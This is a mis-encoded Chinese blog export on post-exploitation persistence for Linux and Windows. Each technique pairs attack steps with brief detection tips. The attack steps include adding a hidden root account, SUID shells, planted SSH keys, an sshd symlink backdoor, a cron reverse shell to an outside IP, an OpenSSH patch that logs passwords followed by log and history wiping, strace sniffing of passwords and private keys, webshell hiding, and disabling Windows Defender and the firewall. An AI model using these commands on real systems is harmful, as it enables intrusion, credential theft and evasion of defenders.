<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd å„éƒ¨åˆ†å«ä¹‰ï¼š</span><br><span class="line">â½¤æˆ·åï¼šå¯†ç ï¼šâ½¤æˆ·IDï¼šç»„IDï¼šèº«ä»½æè¿°ï¼šâ½¤æˆ·çš„å®¶â½¬å½•ï¼šâ½¤æˆ·ç™»å½•åæ‰€ä½¿â½¤çš„SHELL</span><br><span class="line">&#x2F;etc&#x2F;shadow å„éƒ¨åˆ†å«ä¹‰ï¼š</span><br><span class="line">â½¤æˆ·åï¼šå¯†ç çš„MD5åŠ å¯†å€¼ï¼šâ¾ƒç³»ç»Ÿä½¿â½¤ä»¥æ¥â¼ä»¤è¢«ä¿®æ”¹çš„å¤©æ•°ï¼šâ¼ä»¤çš„æœ€â¼©ä¿®æ”¹é—´éš”ï¼šâ¼ä»¤æ›´æ”¹çš„å‘¨æœŸï¼šâ¼ä»¤å¤±æ•ˆçš„</span><br><span class="line">å¤©æ•°ï¼šâ¼ä»¤å¤±æ•ˆä»¥åå¸å·ä¼šè¢«é”å®šå¤šå°‘å¤©ï¼šâ½¤æˆ·å¸å·åˆ°æœŸæ—¶é—´ï¼šä¿ç•™å­—æ®µå°šæœªä½¿â½¤</span><br></pre></td></tr></table></figure>

<h6 id="æ·»åŠ è¶…çº§ç”¨æˆ·"><a href="#æ·»åŠ è¶…çº§ç”¨æˆ·" class="headerlink" title="æ·»åŠ è¶…çº§ç”¨æˆ·"></a>æ·»åŠ è¶…çº§ç”¨æˆ·</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$echo &quot;test:savbSWc4rx8NY:hacker:&#x2F;root:&#x2F;bin&#x2F;bash&quot; &gt;&gt; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>ä¸€äº›ç³»ç»Ÿä¸­ï¼Œå­˜æ”¾ç€åŠ å¯†åçš„ç”¨æˆ·å£ä»¤å­—ã€‚è™½ç„¶è¿™ä¸ªå­—æ®µå­˜æ”¾çš„åªæ˜¯ç”¨æˆ·å£ä»¤çš„åŠ å¯†ä¸²ï¼Œä¸æ˜¯æ˜æ–‡ï¼Œä½†<br>æ˜¯ç”±äº<code>/etc/passwd</code>æ–‡ä»¶å¯¹æ‰€æœ‰ç”¨æˆ·éƒ½å¯è¯»ï¼Œæ‰€ä»¥è¿™ä»æ˜¯ä¸€ä¸ªå®‰å…¨éšæ‚£ã€‚å› æ­¤ï¼Œç°åœ¨è®¸å¤šLinuxç³»ç»Ÿéƒ½ä½¿<br>ç”¨äº†shadowæŠ€æœ¯ï¼ŒæŠŠçœŸæ­£åŠ å¯†åçš„ç”¨æˆ·å£ä»¤å­—æ®µå­˜æ”¾åˆ°<code>/etc/shadow</code>æ–‡ä»¶ä¸­ï¼Œè€Œåœ¨<code>/etc/passwd</code>æ–‡ä»¶çš„<br>å£ä»¤å­—æ®µä¸­åªå­˜æ”¾äº†ä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ï¼Œä¾‹å¦‚â€xâ€æˆ–è€…â€*â€</p>
<h6 id="å¦‚æœç³»ç»Ÿä¸å…è®¸uid-0çš„ç”¨æˆ·è¿œç¨‹ç™»é™†ï¼Œå¯ä»¥å¢åŠ ä¸€ä¸ªæ™®é€šç”¨æˆ·è´¦å·"><a href="#å¦‚æœç³»ç»Ÿä¸å…è®¸uid-0çš„ç”¨æˆ·è¿œç¨‹ç™»é™†ï¼Œå¯ä»¥å¢åŠ ä¸€ä¸ªæ™®é€šç”¨æˆ·è´¦å·" class="headerlink" title="å¦‚æœç³»ç»Ÿä¸å…è®¸uid=0çš„ç”¨æˆ·è¿œç¨‹ç™»é™†ï¼Œå¯ä»¥å¢åŠ ä¸€ä¸ªæ™®é€šç”¨æˆ·è´¦å·"></a>å¦‚æœç³»ç»Ÿä¸å…è®¸uid=0çš„ç”¨æˆ·è¿œç¨‹ç™»é™†ï¼Œå¯ä»¥å¢åŠ ä¸€ä¸ªæ™®é€šç”¨æˆ·è´¦å·</h6><p><code>echo &quot;test:savbSWc4rx8NY:-1:-1:-1:-1:-1:-1:500&quot; &gt;&gt; /etc/shadow</code></p>
<br>

<h5 id="æ’æŸ¥"><a href="#æ’æŸ¥" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># æŸ¥è¯¢ç‰¹æƒç”¨æˆ·ç‰¹æƒç”¨æˆ·(uid ä¸º0)</span><br><span class="line">[root@localhost ~]# awk -F: &#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br><span class="line"># æŸ¥è¯¢å¯ä»¥è¿œç¨‹ç™»å½•çš„å¸å·ä¿¡æ¯</span><br><span class="line">[root@localhost ~]# awk &#39;&#x2F;\$1|\$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br><span class="line"># é™¤rootå¸å·å¤–ï¼Œå…¶ä»–å¸å·æ˜¯å¦å­˜åœ¨sudoæƒé™ã€‚å¦‚éç®¡ç†éœ€è¦ï¼Œæ™®é€šå¸å·åº”åˆ é™¤sudoæƒé™</span><br><span class="line">[root@localhost ~]# more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot;</span><br></pre></td></tr></table></figure>

<br>

<h4 id="0x02-SUID-shell"><a href="#0x02-SUID-shell" class="headerlink" title="0x02 SUID shell"></a>0x02 SUID shell</h4><p>SUID shell æ˜¯ä¸€ç§å¯ç”¨äºä»¥æ‹¥æœ‰è€…æƒé™è¿è¡Œçš„shell</p>
<h5 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h5><p>åˆ›å»ºsuidæƒé™çš„æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp &#x2F;bin&#x2F;bash  &#x2F;tmp&#x2F;.woot</span><br><span class="line">chmod 4755 &#x2F;tmp&#x2F;.woot</span><br><span class="line">ls -al &#x2F;.woot</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·åšç›¸å½“äºå¤åˆ¶äº†ä¸€äº›æ–°çš„bashåˆ°tmpç›®å½•ä¸‹ï¼Œç„¶åå¯ä»¥åœ¨ä½¿ç”¨å®ƒæ—¶è°ƒç”¨rootæƒé™</p>
<p>ä½¿ç”¨æ™®é€šç”¨æˆ·è¿è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;.woot</span><br><span class="line">&#x2F;tmp&#x2F;.woot -p   &#x2F;&#x2F;bash2é’ˆå¯¹suidæœ‰ä¸€äº›ä¿æŠ¤æªæ–½ï¼Œä½¿ç”¨-på‚æ•°æ¥è·å–ä¸€ä¸ªroot shell</span><br></pre></td></tr></table></figure>

<h5 id="æ’æŸ¥-1"><a href="#æ’æŸ¥-1" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#æŸ¥æ‰¾å…·æœ‰suidçš„æƒé™çš„åº”ç”¨</span><br><span class="line">find &#x2F; -perm +4000 -ls</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># åœ¨Linuxä¸­æŸ¥æ‰¾SUIDè®¾ç½®çš„æ–‡ä»¶</span><br><span class="line">find . -perm &#x2F;4000</span><br><span class="line"># åœ¨Linuxä¸­æŸ¥æ‰¾ä½¿ç”¨SGIDè®¾ç½®çš„æ–‡ä»¶</span><br><span class="line">find . -perm &#x2F;2000</span><br><span class="line"># å–æ¶ˆsæƒé™</span><br><span class="line">chmod u-s &#x2F;tmp&#x2F;.woot</span><br></pre></td></tr></table></figure>

<h4 id="0x03-sshå…¬ç§é’¥"><a href="#0x03-sshå…¬ç§é’¥" class="headerlink" title="0x03 sshå…¬ç§é’¥"></a>0x03 sshå…¬ç§é’¥</h4><h5 id="ä½¿ç”¨-1"><a href="#ä½¿ç”¨-1" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h5><p>åœ¨å®¢æˆ·ç«¯ä¸Šç”Ÿæˆä¸€å¯¹å…¬ç§é’¥ï¼Œç„¶åæŠŠå…¬é’¥æ”¾åˆ°æœåŠ¡å™¨ä¸Šï¼ˆ~/.ssh/authorized_keysï¼‰ï¼Œä¿ç•™ç§é’¥ã€‚å½“sshç™»å½•æ—¶ï¼Œsshç¨‹åºä¼šå‘é€ç§é’¥å»å’ŒæœåŠ¡å™¨ä¸Šçš„å…¬é’¥åšåŒ¹é…ï¼Œå¦‚æœåŒ¹é…æˆåŠŸå°±å¯ä»¥ç™»å½•äº†ã€‚</p>
<p>å®¢æˆ·ç«¯</p>
<p><code>ssh-keygen -t rsa</code></p>
<p>è¿›å…¥ <code>/root/.ssh/</code>æ–‡ä»¶å¤¹å³å¯æŸ¥çœ‹åˆ°ç”Ÿæˆå…¬ç§é’¥ï¼Œ<code>id_rsa</code>ä¸ºç§é’¥ï¼Œ<code>id_rsa.pub</code>ä¸ºå…¬é’¥ï¼Œ</p>
<p>å°†å…¬é’¥å¤åˆ¶æ”¾åˆ°ç›®æ ‡æœºå™¨ä¸Šçš„ <code>.ssh/authorized_keys</code>ä¸­     <code>echo id_rsa.pub &gt;&gt; .ssh/authorized_keys </code> </p>
<h5 id="æ’æŸ¥-2"><a href="#æ’æŸ¥-2" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h5><p>æŸ¥çœ‹ <code>/root/.ssh/authoritized_keys</code>æ˜¯å¦è¢«ä¿®æ”¹</p>
<br>

<h4 id="0x04-è½¯è¿æ¥"><a href="#0x04-è½¯è¿æ¥" class="headerlink" title="0x04 è½¯è¿æ¥"></a>0x04 è½¯è¿æ¥</h4><h5 id="ä½¿ç”¨-2"><a href="#ä½¿ç”¨-2" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h5><p>é€šè¿‡è½¯è¿æ¥å»ºç«‹ä¸€ä¸ªsshåé—¨ï¼š</p>
<p><code>ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=8888</code></p>
<p>(æ³¨:å¦‚æœç›®æ ‡åœ¨æ‰§è¡Œè½¯è¿æ¥æ—¶ä½¿ç”¨çš„å…¶ä»–è´¦æˆ·åˆ›å»ºçš„ï¼Œé‚£ä¹ˆåœ¨ç™»é™†æ—¶ä¹Ÿè¦é€‰æ‹©    å¯¹åº”çš„è´¦æˆ·å»ç™»å½•ï¼Œè€Œérootè´¦æˆ·)</p>
<p>æ‰§è¡Œå®Œå åœ¨ä»»æ„æœºå™¨ä¸Šä½¿ç”¨<code>ssh root@xxx.xxx.xxx.xxx -p 8888</code> å³å¯è¿æ¥</p>
<h5 id="æ’æŸ¥-3"><a href="#æ’æŸ¥-3" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h5><p>é€šè¿‡æŸ¥çœ‹ç«¯å£æˆ–è€…è¿›ç¨‹éƒ½ä¼šå‘ç°å¼‚å¸¸è¿æ¥ ä½¿ç”¨ <code>kill -s 9 PID</code> æ€æ‰è¿›ç¨‹å³å¯æ¸…é™¤åé—¨</p>
<p><img src="/posts/29801cba/attachment:d5517d48087cf2e1fd80aacde6f69abc" alt="æˆªå›¾"></p>
<br>

<h4 id="0x05-crontabåå¼¹shell"><a href="#0x05-crontabåå¼¹shell" class="headerlink" title="0x05 crontabåå¼¹shell"></a>0x05 crontabåå¼¹shell</h4><h5 id="ä½¿ç”¨-3"><a href="#ä½¿ç”¨-3" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h5><p>cronè¡¨è¾¾å¼åœ¨çº¿â½£æˆï¼š<a href="http://qqe2.com/cron">http://qqe2.com/cron</a></p>
<ul>
<li>åˆ›å»ºshellè„šæœ¬è„šæœ¬ </li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.28.131/12345 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><code>chmod +sx etc/test.sh</code></p>
<ul>
<li>crontab -e è®¾ç½®å®šæ—¶ä»»åŠ¡</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡</span><br><span class="line">*&#x2F;1 * * * * root &#x2F;etc&#x2F;test.sh</span><br></pre></td></tr></table></figure>

<p>é‡å¯crondæœåŠ¡å°±å¯ç”¨ncæ¥å—shell <code>service cornd restart</code></p>
<h5 id="æ’æŸ¥-4"><a href="#æ’æŸ¥-4" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h5><p>æŸ¥çœ‹å¯ç–‘çš„å®šæ—¶ä»»åŠ¡åˆ—è¡¨</p>
<p><code>crontab -e</code></p>
<br>

<h4 id="0x06-OpenSSH-åé—¨"><a href="#0x06-OpenSSH-åé—¨" class="headerlink" title="0x06 OpenSSH åé—¨"></a>0x06 OpenSSH åé—¨</h4><h5 id="ä½¿ç”¨-4"><a href="#ä½¿ç”¨-4" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h5><p>åˆ©ç”¨opensshåé—¨ï¼Œè®¾ç½®SSHåé—¨å¯†ç åŠrootå¯†ç è®°å½•ä½ç½®ï¼Œéšè”½æ€§è¾ƒå¼ºï¼Œä¸æ˜“è¢«å‘ç°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aã€å¤‡ä»½SSHé…ç½®æ–‡ä»¶</span><br><span class="line">mv &#x2F;etc&#x2F;ssh&#x2F;ssh_config &#x2F;etc&#x2F;ssh&#x2F;ssh_config.old</span><br><span class="line">mv &#x2F;etc&#x2F;ssh&#x2F;sshd_config &#x2F;etc&#x2F;ssh&#x2F;sshd_config.old</span><br><span class="line">bã€è§£å‹å¹¶å®‰è£…è¡¥ä¸</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">cp openssh-5.9p1.patch&#x2F;sshbd5.9p1.diff &#x2F;openssh-5.9p1</span><br><span class="line">cd openssh-5.9p1</span><br><span class="line">patch &lt; sshbd5.9p1.diff</span><br><span class="line">cã€è®°å½•ç”¨æˆ·åå’Œå¯†ç çš„æ–‡ä»¶ä½ç½®åŠå…¶å¯†ç </span><br><span class="line">vi includes.h</span><br><span class="line">#define ILOG &quot;&#x2F;tmp&#x2F;1.txt&quot;           &#x2F;&#x2F;è®°å½•ç™»å½•æœ¬æœºçš„ç”¨æˆ·åå’Œå¯†ç </span><br><span class="line">#define OLOG &quot;&#x2F;tmp&#x2F;2.txt&quot;           &#x2F;&#x2F;è®°å½•æœ¬æœºç™»å½•è¿œç¨‹çš„ç”¨æˆ·åå’Œå¯†ç </span><br><span class="line">#define SECRETPW &quot;123456789&quot;        &#x2F;&#x2F;åé—¨çš„å¯†ç </span><br><span class="line">dã€ä¿®æ”¹ç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line">vi version.h</span><br><span class="line">#define SSH_VERSION &quot;å¡«å…¥ä¹‹å‰è®°ä¸‹æ¥çš„ç‰ˆæœ¬å·,ä¼ªè£…åŸç‰ˆæœ¬&quot;</span><br><span class="line">#define SSH_PORTABLE &quot;å°ç‰ˆæœ¬å·&quot;</span><br><span class="line">eã€å®‰è£…å¹¶ç¼–è¯‘</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;usr --sysconfdir&#x3D;&#x2F;etc&#x2F;ssh --with-pam --with-kerberos5</span><br><span class="line">make clean</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">service sshd restart</span><br><span class="line">fã€å¯¹æ¯”åŸæ¥çš„é…ç½®æ–‡ä»¶ï¼Œä½¿é…ç½®æ–‡ä»¶ä¸€è‡´ï¼Œç„¶åä¿®æ”¹æ–‡ä»¶æ—¥æœŸã€‚</span><br><span class="line">touch -r &#x2F;etc&#x2F;ssh&#x2F;ssh_config.old &#x2F;etc&#x2F;ssh&#x2F;ssh_config</span><br><span class="line">touch -r &#x2F;etc&#x2F;ssh&#x2F;sshd_config.old &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">gã€æ¸…é™¤æ“ä½œè®°å½•</span><br><span class="line">export HISTFILE&#x3D;&#x2F;dev&#x2F;null</span><br><span class="line">export HISTSIZE&#x3D;0</span><br><span class="line">echo &gt;&#x2F;root&#x2F;.bash_history &#x2F;&#x2F;æ¸…ç©ºæ“ä½œæ—¥å¿—</span><br></pre></td></tr></table></figure>

<h5 id="æ’æŸ¥-5"><a href="#æ’æŸ¥-5" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#åˆ©ç”¨straceæŸ¥æ‰¾sshåé—¨</span><br><span class="line"># 1ã€è·å–å¯ç–‘è¿›ç¨‹PID</span><br><span class="line">ps aux | grep sshd</span><br><span class="line"># 2ã€è·Ÿè¸ªsshd PID</span><br><span class="line">strace -o aa -ff -p PID</span><br><span class="line"># 3ã€æŸ¥çœ‹è®°å½•å¯†ç æ‰“å¼€æ–‡ä»¶</span><br><span class="line">grep open sshd* | grep -v -e No -e null -e denied| grep WR</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="0x07-straceåé—¨"><a href="#0x07-straceåé—¨" class="headerlink" title="0x07 straceåé—¨"></a>0x07 straceåé—¨</h4><p>straceæ˜¯ä¸€ä¸ªåŠ¨æ€è·Ÿè¸ªå·¥å…·ï¼Œå®ƒå¯ä»¥è·Ÿè¸ªç³»ç»Ÿè°ƒç”¨çš„æ‰§è¡Œã€‚æˆ‘ä»¬å¯ä»¥æŠŠå®ƒå½“ä½œä¸€ä¸ªé”®ç›˜è®°å½•çš„åé—¨ï¼Œæ¥æ‰©å¤§æˆ‘ä»¬çš„ä¿¡æ¯æ”¶é›†èŒƒå›´ã€‚é€šè¿‡å…¶ä»–æ–¹å¼æ‹¿åˆ°shellï¼Œé€šè¿‡histroyï¼Œæµé‡æŠ“åŒ…ã€æˆ–è€…æœ¬åœ°æ²¡æœ‰ç¿»åˆ°å¯†ç çš„æƒ…å†µä¸‹ã€‚æˆ‘ä»¬è¦æƒ³è·å–å½“å‰<br>ä¸»æœºçš„å¯†ç ï¼Œæˆ–è€…æ˜¯é€šè¿‡è¿™å°ä¸»æœºè¿æ¥åˆ°å…¶ä»–ä¸»æœºçš„å¯†ç ã€‚</p>
<h5 id="è®°å½•sshdè¿›ç¨‹æ˜æ–‡å¯†ç "><a href="#è®°å½•sshdè¿›ç¨‹æ˜æ–‡å¯†ç " class="headerlink" title="è®°å½•sshdè¿›ç¨‹æ˜æ–‡å¯†ç "></a>è®°å½•sshdè¿›ç¨‹æ˜æ–‡å¯†ç </h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(strace -f -F -p &#96;ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#39;print $2&#39;&#125;&#96; -t -e</span><br><span class="line">trace&#x3D;read,write -s 32 2&gt; &#x2F;tmp&#x2F;.sshd.log &amp;)</span><br></pre></td></tr></table></figure>

<p>å½“ç”¨æˆ·é€šè¿‡å¯†ç ç™»é™†æ—¶ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹è®°å½•çš„å¯†ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -E &#39;read\(6, &quot;.+\\0\\0\\0\\.+&quot;&#39; &#x2F;tmp&#x2F;.sshd.log</span><br></pre></td></tr></table></figure>

<h5 id="è®°å½•sshdç§é’¥"><a href="#è®°å½•sshdç§é’¥" class="headerlink" title="è®°å½•sshdç§é’¥"></a>è®°å½•sshdç§é’¥</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(strace -f -F -p &#96;ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#39;print $2&#39;&#125;&#96; -t -e</span><br><span class="line">trace&#x3D;read,write -s 4096 2&gt; &#x2F;tmp&#x2F;.sshd.log &amp;)</span><br></pre></td></tr></table></figure>

<p>å½“ç”¨æˆ·é€šè¿‡ç§é’¥ç™»é™†æ—¶ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹è®°å½•çš„ç§é’¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep &#39;PRIVATE KEY&#39; &#x2F;tmp&#x2F;.sshd.log</span><br></pre></td></tr></table></figure>

<h5 id="é€šè¿‡å‘½ä»¤æ›¿æ¢åŠ¨æ€è·Ÿè¸ªç³»ç»Ÿè°ƒç”¨å’Œæ•°æ®ï¼Œå¯ä»¥ç”¨æ¥è®°å½•ç”¨æˆ·sshã€suã€sudoçš„æ“ä½œã€‚"><a href="#é€šè¿‡å‘½ä»¤æ›¿æ¢åŠ¨æ€è·Ÿè¸ªç³»ç»Ÿè°ƒç”¨å’Œæ•°æ®ï¼Œå¯ä»¥ç”¨æ¥è®°å½•ç”¨æˆ·sshã€suã€sudoçš„æ“ä½œã€‚" class="headerlink" title="é€šè¿‡å‘½ä»¤æ›¿æ¢åŠ¨æ€è·Ÿè¸ªç³»ç»Ÿè°ƒç”¨å’Œæ•°æ®ï¼Œå¯ä»¥ç”¨æ¥è®°å½•ç”¨æˆ·sshã€suã€sudoçš„æ“ä½œã€‚"></a>é€šè¿‡å‘½ä»¤æ›¿æ¢åŠ¨æ€è·Ÿè¸ªç³»ç»Ÿè°ƒç”¨å’Œæ•°æ®ï¼Œå¯ä»¥ç”¨æ¥è®°å½•ç”¨æˆ·sshã€suã€sudoçš„æ“ä½œã€‚</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#vim &#x2F;etc&#x2F;bashrcæˆ–è€… ~&#x2F;.bashrc</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;</span><br><span class="line"># source ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>æƒé™ç»´æŒ</category>
      </categories>
      <tags>
        <tag>æƒé™ç»´æŒ</tag>
      </tags>
  </entry>
  <entry>
    <title>æƒé™ç»´æŒ-Windowsç¯‡(å¾…å®Œæˆ)</title>
    <url>/posts/709e0d6/</url>
    <content><![CDATA[<h3 id="Windowsæƒé™ç»´æŒ"><a href="#Windowsæƒé™ç»´æŒ" class="headerlink" title="Windowsæƒé™ç»´æŒ"></a>Windowsæƒé™ç»´æŒ</h3><h4 id="éšè—æŠ€å·§"><a href="#éšè—æŠ€å·§" class="headerlink" title="éšè—æŠ€å·§"></a>éšè—æŠ€å·§</h4><h5 id="æ–‡ä»¶éšè—"><a href="#æ–‡ä»¶éšè—" class="headerlink" title="æ–‡ä»¶éšè—"></a>æ–‡ä»¶éšè—</h5><p><code>attrib +s +a +h +r c:\test</code></p>
<p>æŠŠåŸæœ¬çš„â½‚ä»¶å¤¹å¢åŠ äº†ç³»ç»Ÿâ½‚ä»¶å±æ€§ã€å­˜æ¡£â½‚ä»¶å±æ€§ã€åªè¯»â½‚ä»¶å±æ€§å’Œéšè—â½‚ä»¶å±æ€§ã€‚</p>
<h5 id="ç³»ç»Ÿæ–‡ä»¶å¤¹å›¾æ ‡"><a href="#ç³»ç»Ÿæ–‡ä»¶å¤¹å›¾æ ‡" class="headerlink" title="ç³»ç»Ÿæ–‡ä»¶å¤¹å›¾æ ‡"></a>ç³»ç»Ÿæ–‡ä»¶å¤¹å›¾æ ‡</h5><h6 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h6><ul>
<li>1.æ–°å»ºæ–‡ä»¶å¤¹ å¹¶å°†æ–‡ä»¶å­˜å…¥</li>
<li>2.ä¿®æ”¹å‘½åä¸º æˆ‘çš„ç”µè„‘.{20D04FE0-3AEA-1069-A2D8-08002B30309D} ç„¶åè®¿é—®è¯¥æ–‡ä»¶å¤¹ï¼Œæ‰“å¼€ä¼šæ‰“å¼€æˆ‘çš„ç”µè„‘</li>
<li>3.å¦‚æœéœ€è¦æŸ¥çœ‹å†…å®¹ å¯ä»¥ä½¿ç”¨winrar ç­‰å»æŸ¥çœ‹æˆ– æ¢å¤</li>
</ul>
<h6 id="ä»£å·"><a href="#ä»£å·" class="headerlink" title="ä»£å·"></a>ä»£å·</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æˆ‘çš„ç”µè„‘.&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;</span><br><span class="line">å›æ”¶ç«™.&#123;645ff040-5081-101b-9f08-00aa002f954e&#125;</span><br><span class="line">æ‹”å·â½¹ç»œ.&#123;992CFFA0-F557-101A-88EC-00DD010CCC48&#125;</span><br><span class="line">æ‰“å°æœº.&#123;2227a280-3aea-1069-a2de-08002b30309d&#125;</span><br><span class="line">æ§åˆ¶â¾¯æ¿.&#123;21ec2020-3aea-1069-a2dd-08002b30309d&#125;</span><br><span class="line">â½¹ä¸Šé‚»å±….&#123;208D2C60-3AEA-1069-A2D7-08002B30309D&#125;</span><br></pre></td></tr></table></figure>

<h5 id="ç•¸å½¢ç›®å½•"><a href="#ç•¸å½¢ç›®å½•" class="headerlink" title="ç•¸å½¢ç›®å½•"></a>ç•¸å½¢ç›®å½•</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#åˆ›å»ºç›®å½•</span><br><span class="line">md a...\      &#x2F;&#x2F;ä¸‰ä¸ªç‚¹,å®é™…æ˜¾ç¤ºä¸º a..</span><br><span class="line">#å¤åˆ¶æ–‡ä»¶</span><br><span class="line">copy test a...\test</span><br><span class="line">#åˆ é™¤ç›®å½•</span><br><span class="line">rd &#x2F;s &#x2F;q a...\</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="åˆ©ç”¨ç³»ç»Ÿä¿ç•™æ–‡ä»¶ååˆ›å»ºæ— æ³•åˆ é™¤çš„webshell"><a href="#åˆ©ç”¨ç³»ç»Ÿä¿ç•™æ–‡ä»¶ååˆ›å»ºæ— æ³•åˆ é™¤çš„webshell" class="headerlink" title="åˆ©ç”¨ç³»ç»Ÿä¿ç•™æ–‡ä»¶ååˆ›å»ºæ— æ³•åˆ é™¤çš„webshell"></a>åˆ©ç”¨ç³»ç»Ÿä¿ç•™æ–‡ä»¶ååˆ›å»ºæ— æ³•åˆ é™¤çš„webshell</h5><p>ï¼ˆæ³¨: ç«ç»’å°±å¯ä»¥ç²‰ç¢â€¦ï¼‰</p>
<p>Windows ä¸‹ä¸èƒ½å¤Ÿä»¥ä¸‹é¢è¿™äº›å­—æ ·æ¥å‘½åæ–‡ä»¶/æ–‡ä»¶å¤¹ï¼ŒåŒ…æ‹¬ï¼šauxï¼Œcom1ï¼Œcom2ï¼Œprnï¼Œconå’Œnulç­‰ï¼Œä½†æ˜¯é€šè¿‡cmdä¸‹æ˜¯å¯ä»¥åˆ›å»ºæ­¤ç±»æ–‡ä»¶å¤¹çš„ï¼Œä½¿ç”¨copyå‘½ä»¤å³å¯å®ç°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># æ–¹æ³•</span><br><span class="line">copy 1.jsp   \\.\E:\test\aux.jsp</span><br><span class="line">del \\.\E:\test\aux.jsp</span><br><span class="line">type \\.\E:\test\aux.jsp</span><br><span class="line"></span><br><span class="line">#å¯ä»¥ä½¿ç”¨attribéšè—æ–‡ä»¶ </span><br><span class="line">#è¿™ç§åœ¨è®¾ç½®æ˜¾ç¤ºéšè—æ–‡ä»¶å&#x2F;dir  ä¹Ÿæ— æ³•çœ‹åˆ°</span><br><span class="line">attrib 1.txt &#x2F;&#x2F;æŸ¥çœ‹â½‚ä»¶å±æ€§ </span><br><span class="line">attrib 1.txt -r -s &#x2F;&#x2F;åˆ é™¤â½‚ä»¶å±æ€§</span><br><span class="line">attrib +H +S 1.asp æ”¹å˜â½‚ä»¶å±æ€§ï¼Œéšè—1.asp</span><br><span class="line">attrib -H -S 1.asp </span><br></pre></td></tr></table></figure>

<h5 id="é©±åŠ¨çº§æ–‡ä»¶éšè—"><a href="#é©±åŠ¨çº§æ–‡ä»¶éšè—" class="headerlink" title="é©±åŠ¨çº§æ–‡ä»¶éšè—"></a>é©±åŠ¨çº§æ–‡ä»¶éšè—</h5><p>å¯ä»¥åˆ©ç”¨ <code>Easy File Locker </code> å¯¹æ–‡ä»¶å¤¹è¿›è¡Œéšè—</p>
<p> ä¸‹è½½é“¾æ¥ï¼š <a href="http://www.xoslab.com/efl.html">http://www.xoslab.com/efl.html</a></p>
<br>

<br>

<h4 id="å…³é—­æ€è½¯"><a href="#å…³é—­æ€è½¯" class="headerlink" title="å…³é—­æ€è½¯"></a>å…³é—­æ€è½¯</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;meterperterä¸­ä½¿ç”¨</span><br><span class="line">run killav </span><br><span class="line">&#x2F;&#x2F;å…³é—­é˜²ç«å¢™</span><br><span class="line">netsh advfirewall set allprofiles state off </span><br><span class="line">&#x2F;&#x2F;å…³é—­windowsdefender</span><br><span class="line">net stop windefend </span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰å‡ ä¸ªå¤§ä½¬githubä¸Šå…³æ€è½¯çš„é¡¹ç›®</p>
<p><a href="https://github.com/Yaxser/Backstab">https://github.com/Yaxser/Backstab</a></p>
